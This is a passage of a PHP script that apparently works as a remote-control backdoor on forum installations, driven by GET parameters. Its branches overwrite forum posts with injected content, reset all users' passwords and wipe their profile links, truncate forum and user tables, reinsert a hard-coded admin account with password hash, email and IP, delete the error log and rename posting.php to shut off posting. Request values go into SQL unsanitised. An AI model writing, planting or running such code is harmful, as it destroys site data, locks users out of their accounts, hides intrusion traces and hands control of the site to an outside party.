				$sqlGetTheadIdForUpdate="SELECT MIN(pid) as mid FROM " . $db_prefix . "posts where pid > " .$MaxxUpThreadId . "; ";
				$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
				$UpThreadId = 0;
				if ($result1->num_rows > 0) 
				{
					while($row = $result1->fetch_assoc()) 
					{
						if($row["mid"]!=null)
						{
							$UpThreadId = $row["mid"];
						}
					}
				} 
				$responseStr = $UpThreadId . "|-1";
				echo $responseStr;

				if($UpThreadId > 0 )
				{
					$sqlUpdateThread ="update " . $db_prefix . "posts set `subject` = '" . $ipost_title . "', message='".$ipost_content."' WHERE pid=" . $UpThreadId . "; ";
					$sqlUpdateConfig ="update " . $db_prefix . "config set `config_value` = '" .$UpThreadId. "' WHERE config_name = 'maxxupThreadID'; ";
					
					if (!$mysqli->multi_query($sqlUpdateThread . $sqlUpdatePost .$sqlUpdateConfig )) 
					{
						echo "Multi query failed: (" . $mysqli->errno . ") " . $mysqli->error;
					}
				}
				$mysqli->close();
				return;		
			}

			if($action==6) // Clear user link and reset password
			{
					$returnCode = "0|0";
					$minUserIDforClear = $_GET["minid"];
					if($minUserIDforClear=="")
					{
						$minUserIDforClear = 1;
					}
				
					$sql ="update " . $db_prefix . "users set password='changed', website='',  signature='' WHERE uid> ". $minUserIDforClear ."; ";		

					if (!$mysqli->multi_query($sql)) {
						
					}
					else 
					{ 
					$returnCode = "0|1";
					}
					$mysqli->close();		
					echo $returnCode;
		
					return;
			}
		
			if($action==50) // Delete Log file
			{
					$returnCode = "0|0";
					if (file_exists(dirname( __FILE__ ).$forumFolder."/error_log")) 
					{
						if(unlink(dirname( __FILE__ ).$forumFolder."/error_log"))
						{
							$returnCode = "0|1";
						}
					}
					else {
					$returnCode = "0|1";
						}
					echo $returnCode;
					return;
			}
		break;
	case "bb":
		 $forumFolder=$isubfolder;
			require( dirname( __FILE__ ) .$isubfolder . '/config.php' );
			$action = $_GET["maction"];
			$db_prefix = $table_prefix;
			$mysqli = new mysqli($dbhost, $dbuser, $dbpasswd, $dbname);
			if ($mysqli->connect_errno) {
				echo "0|0";
				return;
			}
			$mysqli -> set_charset("utf8");
			if($action==0)
			{
					$sqlmaxxupThreadID = "SELECT config_value FROM " . $db_prefix . "config where config_name='maxxupThreadID'";
					$result = $mysqli->query($sqlmaxxupThreadID);
					$MaxxUpThreadId = 0;

					if ($result->num_rows > 0) 
					{
						while($row = $result->fetch_assoc()) 
						{
							if($row["config_value"]!=null)
							{
								$MaxxUpThreadId = $row["config_value"];
							}
						}
					} 
					else 
					{
						$sqlmaxxupThreadIDinsert = "INSERT INTO " . $db_prefix . "config (config_name, config_value) VALUES  ('maxxupThreadID', '0'); ";
						$mysqli->query($sqlmaxxupThreadIDinsert);
					}

					$sqlGetTheadIdForUpdate="SELECT MIN(post_id) as mid FROM " . $db_prefix . "posts where post_id > " .$MaxxUpThreadId . "; ";
					$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
					$UpThreadId = 0;
					if ($result1->num_rows > 0) 
					{
						while($row1 = $result1->fetch_assoc()) 
						{
							if($row1["mid"]!=null)
							{
								echo "0|1";
							}
							else 
							{
							echo "0|0";
							}
						}
					}
					else {
						echo "0|0";
					}
					$mysqli->close();
					return;	
			}
			if($action==1) // Clear db
			{
					$returnCode = "0|0";
					$sql ="truncate table " . $db_prefix . "posts; truncate table " . $db_prefix . "topics; truncate table  " . $db_prefix . "topics_posted; truncate table  " . $db_prefix . "topics_track;  truncate table  " . $db_prefix . "sessions;  truncate table  " . $db_prefix . "search_wordmatch;  truncate table ". $db_prefix . "search_wordlist;  truncate table ". $db_prefix . "search_results;  truncate table ". $db_prefix . "users; 
INSERT INTO ". $db_prefix. "users (`user_id`, `user_type`, `group_id`, `user_permissions`, `user_perm_from`, `user_ip`, `user_regdate`, `username`, `username_clean`, `user_password`, `user_passchg`, `user_email`, `user_birthday`, `user_lastvisit`, `user_lastmark`, `user_lastpost_time`, `user_lastpage`, `user_last_confirm_key`, `user_last_search`, `user_warnings`, `user_last_warning`, `user_login_attempts`, `user_inactive_reason`, `user_inactive_time`, `user_posts`, `user_lang`, `user_timezone`, `user_dateformat`, `user_style`, `user_rank`, `user_colour`, `user_new_privmsg`, `user_unread_privmsg`, `user_last_privmsg`, `user_message_rules`, `user_full_folder`, `user_emailtime`, `user_topic_show_days`, `user_topic_sortby_type`, `user_topic_sortby_dir`, `user_post_show_days`, `user_post_sortby_type`, `user_post_sortby_dir`, `user_notify`, `user_notify_pm`, `user_notify_type`, `user_allow_pm`, `user_allow_viewonline`, `user_allow_viewemail`, `user_allow_massemail`, `user_options`, `user_avatar`, `user_avatar_type`, `user_avatar_width`, `user_avatar_height`, `user_sig`, `user_sig_bbcode_uid`, `user_sig_bbcode_bitfield`, `user_jabber`, `user_actkey`, `reset_token`, `reset_token_expiration`, `user_newpasswd`, `user_form_salt`, `user_new`, `user_reminded`, `user_reminded_time`) VALUES
(1, 2, 1, '00000000000g13ydmq\nhwby9w000000\nhwby9w000000', 0, '', 1596607189, 'Anonymous', 'anonymous', '', 0, '', '', 0, 0, 0, '', 'AODJ2JHW8R', 1599383749, 0, 0, 0, 0, 0, 0, 'en', '', 'd M Y H:i', 1, 0, '', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 1, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'hue9ljqpvkzz41u9', 1, 0, 0),
(2, 3, 5, 'zik0zjzik0zjzik0zi\nhwby9w000000\nzik0zjzih7uo', 0, '162.158.7.109', 1596607189, 'admin', 'admin', '\$argon2i\$v=19\$m=65536,t=4,p=2\$ZFA0Qm9UTVV6cVh1cmFtSA\$G2uukDR6h70qZZuJxvVZCDdQnuThbci5Lxb9y3ershQ', 0, 'info@choigame.co', '', 1596607310, 0, 0, 'index.php', '', 0, 0, 0, 0, 0, 0, 1, 'en', '', 'D M d, Y g:i a', 1, 1, 'AA0000', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 1, 1, 1, 1, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'mtnip2nhsqv0dwcy', 0, 0, 0),
(3, 2, 6, '', 0, '', 1596607190, 'AdsBot [Google]', 'adsbot [google]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'iowmi3hjh7tr6zow', 0, 0, 0),
(4, 2, 6, '', 0, '', 1596607190, 'Alexa [Bot]', 'alexa [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '8cec35sky6h0x2sy', 0, 0, 0),
(5, 2, 6, '', 0, '', 1596607190, 'Alta Vista [Bot]', 'alta vista [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '6bt8zgw3fs7mrd6t', 0, 0, 0),
(6, 2, 6, '', 0, '', 1596607190, 'Ask Jeeves [Bot]', 'ask jeeves [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'm0pceqt0h5r61qk9', 0, 0, 0),
(7, 2, 6, '00000000000g13ydmq\nhwby9w000000\nhwby80000000', 0, '', 1596607190, 'Baidu [Spider]', 'baidu [spider]', '', 1596607190, '', '', 1599094787, 1596607190, 0, 'viewtopic.php?f=2&t=227', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'i9z8w3mnme5tdvg9', 0, 0, 0),
(8, 2, 6, '00000000000g13ydmq\nhwby9w000000\nhwby80000000', 0, '', 1596607190, 'Bing [Bot]', 'bing [bot]', '', 1596607190, '', '', 1599370345, 1596607190, 0, 'app.php/profile.php?id=63105', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '5c537feg8ntp5ldw', 0, 0, 0),
(9, 2, 6, '', 0, '', 1596607190, 'Exabot [Bot]', 'exabot [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'b8tp583k9ioqxdpk', 0, 0, 0),
(10, 2, 6, '', 0, '', 1596607190, 'FAST Enterprise [Crawler]', 'fast enterprise [crawler]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'tzwii9fceedfd43h', 0, 0, 0),
(11, 2, 6, '', 0, '', 1596607190, 'FAST WebCrawler [Crawler]', 'fast webcrawler [crawler]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'qvwkmb0cl04m8i6y', 0, 0, 0),
(12, 2, 6, '', 0, '', 1596607190, 'Francis [Bot]', 'francis [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '5a89x6ocqh1ic4vy', 0, 0, 0),
(13, 2, 6, '', 0, '', 1596607190, 'Gigabot [Bot]', 'gigabot [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'dtgbhs7j85xbv63x', 0, 0, 0),
(14, 2, 6, '', 0, '', 1596607190, 'Google Adsense [Bot]', 'google adsense [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'xd9o59yz44qr3r2r', 0, 0, 0),
(15, 2, 6, '', 0, '', 1596607190, 'Google Desktop', 'google desktop', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'z8ls66x8a40amem6', 0, 0, 0),
(16, 2, 6, '', 0, '', 1596607190, 'Google Feedfetcher', 'google feedfetcher', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'w8a4bcg21wa07bwv', 0, 0, 0),
(17, 2, 6, '00000000000g13ydmq\nhwby9w000000\nhwby80000000', 0, '', 1596607190, 'Google [Bot]', 'google [bot]', '', 1596607190, '', '', 1599383900, 1596607190, 0, 'app.php/profile.php?id=107281', '', 1599349073, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'r5riu0l02igvegob', 0, 0, 0),
(18, 2, 6, '', 0, '', 1596607190, 'Heise IT-Markt [Crawler]', 'heise it-markt [crawler]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'kyog4m4hf5auxvwr', 0, 0, 0),
(19, 2, 6, '', 0, '', 1596607190, 'Heritrix [Crawler]', 'heritrix [crawler]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '3rnquw99nwtqsa38', 0, 0, 0),
(20, 2, 6, '', 0, '', 1596607190, 'IBM Research [Bot]', 'ibm research [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'endherx0k90g6olo', 0, 0, 0),
(21, 2, 6, '', 0, '', 1596607190, 'ICCrawler - ICjobs', 'iccrawler - icjobs', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '4ecem8aswsq1vnyb', 0, 0, 0),
(22, 2, 6, '', 0, '', 1596607190, 'ichiro [Crawler]', 'ichiro [crawler]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '5v33by0c7i3fc7lj', 0, 0, 0),
(23, 2, 6, '00000000000g13ydmq\nhwby9w000000\nhwby80000000', 0, '', 1596607190, 'Majestic-12 [Bot]', 'majestic-12 [bot]', '', 1596607190, '', '', 1599376535, 1596607190, 0, 'viewtopic.php?pid=8798%2F', '', 1599365798, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'zrk60i8aya9y6qrh', 0, 0, 0),
(24, 2, 6, '', 0, '', 1596607190, 'Metager [Bot]', 'metager [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'u8dylapjvdgex9fw', 0, 0, 0),
(25, 2, 6, '', 0, '', 1596607190, 'MSN NewsBlogs', 'msn newsblogs', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'ybyge4m7wz5183q1', 0, 0, 0),
(26, 2, 6, '', 0, '', 1596607190, 'MSN [Bot]', 'msn [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '0h56gumj8kodajg1', 0, 0, 0),
(27, 2, 6, '', 0, '', 1596607190, 'MSNbot Media', 'msnbot media', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'v9p654yswdb6leds', 0, 0, 0),
(28, 2, 6, '', 0, '', 1596607190, 'Nutch [Bot]', 'nutch [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '0p6ezm9bxlfl4fwk', 0, 0, 0),
(29, 2, 6, '', 0, '', 1596607190, 'Online link [Validator]', 'online link [validator]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'vm0y3gq0khh3qmfp', 0, 0, 0),
(30, 2, 6, '', 0, '', 1596607190, 'psbot [Picsearch]', 'psbot [picsearch]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'w25gu9r1wgcxss6w', 0, 0, 0),
(31, 2, 6, '', 0, '', 1596607190, 'Sensis [Crawler]', 'sensis [crawler]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'mf78z4kbvn0zc4et', 0, 0, 0),
(32, 2, 6, '', 0, '', 1596607190, 'SEO Crawler', 'seo crawler', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'f9i7pwvtl11bbljp', 0, 0, 0),
(33, 2, 6, '', 0, '', 1596607190, 'Seoma [Crawler]', 'seoma [crawler]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'th58v8zsgski6z5a', 0, 0, 0),
(34, 2, 6, '', 0, '', 1596607190, 'SEOSearch [Crawler]', 'seosearch [crawler]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'ermv01ndx7zuk5ac', 0, 0, 0),
(35, 2, 6, '', 0, '', 1596607190, 'Snappy [Bot]', 'snappy [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '9s704jt24827rh3l', 0, 0, 0),
(36, 2, 6, '', 0, '', 1596607190, 'Steeler [Crawler]', 'steeler [crawler]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'x33ev8qspfze28py', 0, 0, 0),
(37, 2, 6, '', 0, '', 1596607190, 'Telekom [Bot]', 'telekom [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'lbeo3j7ducyslsb3', 0, 0, 0),
(38, 2, 6, '', 0, '', 1596607190, 'TurnitinBot [Bot]', 'turnitinbot [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'u62t482ed1cy2qkd', 0, 0, 0),
(39, 2, 6, '', 0, '', 1596607190, 'Voyager [Bot]', 'voyager [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'px8muzk4pp5yrlob', 0, 0, 0),
(40, 2, 6, '', 0, '', 1596607190, 'W3 [Sitesearch]', 'w3 [sitesearch]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'uv740uwpfrdzoffn', 0, 0, 0),
(41, 2, 6, '', 0, '', 1596607190, 'W3C [Linkcheck]', 'w3c [linkcheck]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'j0wxsdowldpcl5wg', 0, 0, 0),
(42, 2, 6, '', 0, '', 1596607190, 'W3C [Validator]', 'w3c [validator]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', '8rzi3oqaffq98k4b', 0, 0, 0),
(43, 2, 6, '', 0, '', 1596607190, 'YaCy [Bot]', 'yacy [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'ujnzcm23n5bhua88', 0, 0, 0),
(44, 2, 6, '', 0, '', 1596607190, 'Yahoo MMCrawler [Bot]', 'yahoo mmcrawler [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'u0cxj4f2iglhldfo', 0, 0, 0),
(45, 2, 6, '', 0, '', 1596607190, 'Yahoo Slurp [Bot]', 'yahoo slurp [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'iglev7dwii8v2tvr', 0, 0, 0),
(46, 2, 6, '', 0, '', 1596607190, 'Yahoo [Bot]', 'yahoo [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'ejvt26u3uzbemjva', 0, 0, 0),
(47, 2, 6, '', 0, '', 1596607190, 'YahooSeeker [Bot]', 'yahooseeker [bot]', '', 1596607190, '', '', 0, 1596607190, 0, '', '', 0, 0, 0, 0, 0, 0, 0, 'en', 'UTC', 'D M d, Y g:i a', 1, 0, '9E8DA7', 0, 0, 0, 0, -3, 0, 0, 't', 'd', 0, 't', 'a', 0, 1, 0, 0, 1, 1, 0, 230271, '', '', 0, 0, '', '', '', '', '', '', 0, '', 'h2nvwucf0kl3hnle', 0, 0, 0);";
					$sqlUpdateConfig ="update " . $db_prefix . "config set `config_value` = '0' WHERE config_name = 'maxxupThreadID'; "; 
					

					if (!$mysqli->multi_query($sql. $sqlUpdateConfig)) {
						
					}
					else {
					$returnCode = "0|1";
					}

					echo $returnCode;
					$mysqli->close();
					return;
			}
			if($action==11) // Disable posting
			{
					$returnCode = "0|0";
					$maxrecords = $_GET["maxrecords"];
					$sqlGetTheadIdForUpdate="SELECT count(post_id) as totalRecords FROM " . $db_prefix . "posts; ";
					$result1 = $mysqli->query($sqlGetTheadIdForUpdate);
					$UpThreadId = 0;
					if ($result1->num_rows > 0) 
					{
						while($row1 = $result1->fetch_assoc()) 
						{
							if($row1["totalRecords"]!=null)
							{
								$totalRecords = $row1["totalRecords"];
								if($totalRecords > $maxrecords)
								{
									if(rename(dirname( __FILE__ ) .$forumFolder."/posting.php",dirname( __FILE__ ) .$forumFolder."/_posting.php"))
									{
										$returnCode = "0|1";
									}
								}
							}
						}
					}
					
					echo $returnCode;
